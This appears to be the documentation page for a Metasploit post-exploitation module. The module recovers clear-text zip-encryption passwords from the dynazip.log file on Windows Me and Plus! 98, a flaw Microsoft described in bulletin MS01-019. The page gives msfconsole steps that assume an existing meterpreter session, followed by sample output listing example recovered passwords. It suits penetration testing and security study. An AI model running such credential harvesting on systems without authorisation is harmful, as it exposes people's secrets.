## Vulnerable Application

  This post-exploitation module extracts clear text credentials from dynazip.log.

  The dynazip.log file is located in `%WINDIR%` and contains log entries generated during encryption of Compressed Folders (zip files) in Microsoft&reg; Plus! 98 and Windows&reg; Me. Each log entry contains detailed diagnostic information generated during the encryption process, including the zip file name and the password used to encrypt the zip file in clear text.

  Microsoft released details of the vulnerability in [Microsoft Security Bulletin MS01-019](https://technet.microsoft.com/en-us/library/security/MS01-019) rated as Critical. A patch which disabled use of the log file was also released; however the patch failed to clear the contents of the existing log file.

  Microsoft&reg; Plus! 98 and Windows&reg; Me are no longer supported by Microsoft.


## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/credentials/dynazip_log`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see the extracted credentials in the module output


## Example Run

  **Default Output**

  ```
  msf post(dynazip_log) > exploit 

  [+] Found DynaZip log file: C:\WINDOWS\dynazip.log
  [+] File: 'C:\WINDOWS\Desktop\secret.zip' -- Password: 'my secret password!'
  [+] File: 'C:\WINDOWS\Desktop\private.zip' -- Password: 'priv8'
  [+] File: 'C:\WINDOWS\Desktop\thepasswordisaspace.zip' -- Password: ' '
  [+] File: 'C:\WINDOWS\Desktop\earthbound.zip' -- Password: 'fuzzy pickles'

  ZIP Passwords
  =============

  File Path                                   Password
  ---------                                   --------
  C:\WINDOWS\Desktop\earthbound.zip           fuzzy pickles
  C:\WINDOWS\Desktop\private.zip              priv8
  C:\WINDOWS\Desktop\secret.zip               my secret password!
  C:\WINDOWS\Desktop\thepasswordisaspace.zip   

  [*] Post module execution completed
  ```

  **Verbose Output**

  ```
  msf post(dynazip_log) > set verbose true
  verbose => true
  msf post(dynazip_log) > exploit 

  [+] Found DynaZip log file: C:\WINDOWS\dynazip.log
  [*] Processing log file (6614 bytes)
  [*] Processing log entry for C:\WINDOWS\Desktop\secret.zip
  [+] File: 'C:\WINDOWS\Desktop\secret.zip' -- Password: 'my secret password!'
  [*] Processing log entry for C:\WINDOWS\Desktop\private.zip
  [+] File: 'C:\WINDOWS\Desktop\private.zip' -- Password: 'priv8'
  [*] Processing log entry for C:\WINDOWS\Desktop\thepasswordisaspace.zip
  [+] File: 'C:\WINDOWS\Desktop\thepasswordisaspace.zip' -- Password: ' '
  [*] Processing log entry for C:\WINDOWS\Desktop\earthbound.zip
  [+] File: 'C:\WINDOWS\Desktop\earthbound.zip' -- Password: 'fuzzy pickles'
  [*] Processing log entry for C:\WINDOWS\Desktop\this file is not encrypted.zip
  [*] Did not find a password

  ZIP Passwords
  =============

  File Path                                   Password
  ---------                                   --------
  C:\WINDOWS\Desktop\earthbound.zip           fuzzy pickles
  C:\WINDOWS\Desktop\private.zip              priv8
  C:\WINDOWS\Desktop\secret.zip               my secret password!
  C:\WINDOWS\Desktop\thepasswordisaspace.zip   

  [*] Post module execution completed
  ```


## Example Log Entry

  An example dynazip.log log file entry is shown below:

  ```
  --- DynaZIP ZIP Diagnostic Log - Version: 3.00.16 - 02/22/17  17:01:46 ---
  Function:  5 
  lpszZIPFile: 0x00437538 
  C:\WINDOWS\Desktop\secret.zip
  lpszItemList: 0x0059e878 
  "secret.txt"
  lpMajorStatus: 0x00000000 
  lpMajorUserData: 0x00000000 
  lpMinorStatus: 0x00000000 
  lpMinorUserData: 0x00000000 
  dosifyFlag: 0 
  recurseFlag: 0 
  compFactor: 5 
  quietFlag: 1 
  pathForTempFlag: 0 
  lpszTempPath: 0x00000000 
  ???
  fixFlag: 0 
  fixHarderFlag: 0 
  includeVolumeFlag: 0 
  deleteOriginalFlag: 0 
  growExistingFlag: 0 
  noDirectoryNamesFlag: 0 
  convertLFtoCRLFFlag: 0 
  addCommentFlag: 0 
  lpszComment: 0x00000000 
  ???
  afterDateFlag: 0 
  lpszDate: 0x00000000 
  oldAsLatestFlag: 0 
  includeOnlyFollowingFlag: 0 
  lpszIncludeFollowing: 0x00000000 
  ???
  excludeFollowingFlag: 0 
  lpszExludeFollowing: 0x00000000 
  ???
  noDirectoryEntriesFlag: 0 
  includeSysHiddenFlag: 1 
  dontCompressTheseSuffixesFlag: 0 
  lpszStoreSuffixes: 0x00000000 
  ???
  encryptFlag: 1 
  lpszEncryptCode: 0x712185d4 
  my secret password!
  lpMessageDisplay: 0x7120ca22 
  lpMessageDisplayData: 0x00000000 
  wMultiVolControl: 0x0000 
  wZipSubOptions: 0x0000 
  lResv1: 0x00000000 
  lResv2: 0x00000000 
  lpszExtProgTitle: 0x00000000 
  ???
  lpRenameProc: 0x71203919 
  lpRenameUserData: 0x0059eb8a 
  lpMemBlock: 0x004e3a0c 
  lMemBlockSize: 6 
  ```
